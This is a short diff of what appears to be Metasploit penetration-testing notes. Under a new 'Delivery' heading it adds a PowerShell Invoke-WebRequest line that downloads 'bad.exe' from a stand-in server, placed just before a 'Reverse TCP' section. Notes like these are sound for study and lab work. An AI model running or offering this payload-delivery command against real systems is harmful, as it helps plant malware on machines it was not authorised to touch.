@@ -10,6 +10,12 @@
 
 * [installing metasploit on linux](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/#installing-the-metasploit-framework-on-linux)
 
+### Delivery
+
+```
+ Invoke-WebRequest http://server:8000/bad.exe -UseBasicParsing -OutFile bad.exe
+```
+
 ### Reverse TCP
 
 ```
